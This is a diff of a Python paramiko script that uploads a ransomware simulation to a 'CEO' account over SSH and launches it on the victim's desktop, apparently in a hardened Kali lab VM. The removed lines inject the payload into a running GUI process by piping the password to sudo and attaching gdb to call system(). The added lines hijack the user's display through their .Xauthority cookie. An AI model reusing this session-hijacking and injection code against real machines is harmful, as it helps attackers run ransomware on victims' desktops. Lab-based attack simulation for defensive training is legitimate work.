@@ -54,44 +54,20 @@ root.mainloop()
         ssh.exec_command("chmod +x /tmp/ransom_sim.py")
         sftp.close()
 
-        print("[*] Bypassing X11/Wayland Authorization via GDB injection...")
+        print("[*] Triggering GUI using active Xauthority...")
         
-        # We need to find the PID of a process running on the active display.
-        # xfdesktop is common on Kali (XFCE), gnome-shell for GNOME, etc.
-        # We grab the first process we can find that belongs to the user.
-        find_pid_cmd = f"pgrep -u {USERNAME} -f 'xfdesktop|gnome-shell|plasmashell|xfce4-session' | head -n 1"
-        stdin, stdout, stderr = ssh.exec_command(find_pid_cmd)
-        pid = stdout.read().decode().strip()
-
-        if not pid:
-            # Fallback to the first GUI process we can find for the user
-            stdin, stdout, stderr = ssh.exec_command(f"pgrep -u {USERNAME} | head -n 1")
-            pid = stdout.read().decode().strip()
-
-        if not pid:
-            print("[-] Could not find an active GUI process for the user. Are they logged in?")
-            ssh.close()
-            sys.exit(1)
-            
-        print(f"[+] Found active GUI process PID: {pid}")
-
-        # Now we use gdb to attach to that PID, call system() to run our script, and detach.
-        # We use sudo to get the necessary permissions to attach to the process.
-        # We use -p to attach, -batch to run non-interactively, and -ex to execute commands.
-        gdb_cmd = (
-            f"echo '{PASSWORD}' | sudo -S gdb -p {pid} -batch "
-            f"-ex 'call (int)system(\"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &\")' "
-            f"-ex 'detach' "
-            f"-ex 'quit'"
+        # We explicitly point to the CEO user's Xauthority file.
+        # Because CEO is logged in, this file contains the valid cookie for the display.
+        exec_cmd = (
+            f"export DISPLAY=:0; "
+            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
+            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
         )
         
-        print("[*] Injecting command into GUI process...")
-        stdin, stdout, stderr = ssh.exec_command(gdb_cmd)
-        
-        # Wait for the command to finish
-        stdout.channel.recv_exit_status()
+        ssh.exec_command(exec_cmd)
         
         print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
+        print("[*] (If it fails, run: ssh CEO@172.16.1.100 'cat /tmp/gui_out.log')")
         ssh.close()
 
     except paramiko.AuthenticationException:
